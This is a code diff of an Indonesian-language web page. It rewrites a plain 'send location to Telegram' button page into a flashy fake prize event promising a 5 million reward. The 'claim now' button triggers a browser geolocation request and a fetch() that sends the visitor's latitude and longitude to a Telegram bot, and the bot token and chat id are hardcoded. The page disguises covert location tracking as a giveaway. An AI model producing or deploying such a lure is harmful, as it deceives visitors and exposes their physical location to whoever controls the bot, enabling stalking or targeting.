@@ -1,33 +1,124 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Kirim Lokasi</title>
+<title>Event 1.302.383</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 
 <style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
 body{
+    min-height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
-    height:100vh;
-    font-family:Arial;
-    background:#f2f2f2;
+    font-family:'Poppins', sans-serif;
+    background: linear-gradient(135deg, #ff8fc7, #ff3f9f);
+    padding:20px;
+    overflow:hidden;
 }
+
+/* Tulisan berjalan */
+.marquee{
+    position:absolute;
+    top:0;
+    width:100%;
+    background: rgba(255,255,255,0.2);
+    backdrop-filter: blur(10px);
+    overflow:hidden;
+    white-space:nowrap;
+}
+
+.marquee span{
+    display:inline-block;
+    padding:12px 0;
+    font-weight:600;
+    color:#fff;
+    animation: jalan 12s linear infinite;
+}
+
+@keyframes jalan{
+    from { transform: translateX(100%); }
+    to { transform: translateX(-100%); }
+}
+
+/* Card */
+.container{
+    width:100%;
+    max-width:420px;
+    background: rgba(255,255,255,0.15);
+    backdrop-filter: blur(20px);
+    border-radius:20px;
+    padding:40px 25px;
+    text-align:center;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+}
+
+/* Title */
+h1{
+    color:#fff;
+    font-size:clamp(20px, 5vw, 26px);
+    font-weight:700;
+    margin-bottom:15px;
+}
+
+/* Button */
 button{
-    padding:20px 30px;
-    font-size:18px;
+    width:100%;
+    padding:16px;
+    font-size:16px;
+    font-weight:600;
     border:none;
-    border-radius:10px;
-    background:#0088cc;
+    border-radius:50px;
+    background: linear-gradient(45deg, #ff007f, #ff4db8);
     color:white;
+    cursor:pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 20px rgba(255, 0, 128, 0.35);
+    animation: pulse 1.5s infinite;
+}
+
+/* Efek denyut */
+@keyframes pulse{
+    0%{ box-shadow: 0 0 0 0 rgba(255,0,128,0.7); }
+    70%{ box-shadow: 0 0 0 15px rgba(255,0,128,0); }
+    100%{ box-shadow: 0 0 0 0 rgba(255,0,128,0); }
+}
+
+button:hover{
+    transform: translateY(-3px);
+}
+
+button:active{
+    transform: scale(0.95);
+}
+
+@media (max-width: 360px){
+    .container{
+        padding:30px 20px;
+    }
 }
 </style>
 </head>
 
 <body>
 
-<button onclick="kirimLokasi()">Kirim Lokasi ke Telegram</button>
+<!-- Tulisan berjalan -->
+<div class="marquee">
+    <span>🎉 EVENT TERBATAS! 💎 Klaim Hadiah 5 Juta Sekarang 🚀 Jangan Sampai Terlewat! 🔥🔥🔥</span>
+</div>
+
+<div class="container">
+    <h1>💎 Event 1 - 5 Juta 🚀</h1>
+    <button onclick="kirimLokasi()">🎁🔥 Klaim Sekarang 💸✨</button>
+</div>
 
 <script>
 function kirimLokasi(){
@@ -45,41 +136,25 @@ function kirimLokasi(){
         var token = "8476879887:AAF_nJGgUvg7QqOMTcx9YDAiotT1HKhUVl4";
         var chat_id = "8353745847";
 
-        // Kirim pesan dulu
-        fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: chat_id,
-                text: "Lokasi baru terdeteksi 📍"
-            })
-        });
-
-        // Kirim lokasi
         fetch("https://api.telegram.org/bot" + token + "/sendLocation", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: chat_id,
                 latitude: lat,
                 longitude: lon
             })
         })
-        .then(response => {
-            alert("Lokasi berhasil dikirim ke Telegram");
+        .then(() => {
+            alert("✅ Berhasil terkirim 💎");
         })
-        .catch(error => {
-            alert("Gagal mengirim lokasi");
+        .catch(() => {
+            alert("❌ Gagal mengirim");
         });
 
     }, function(){
-        alert("Izin lokasi ditolak");
+        alert("⚠️ Izin lokasi ditolak");
     });
-
 }
 </script>
 
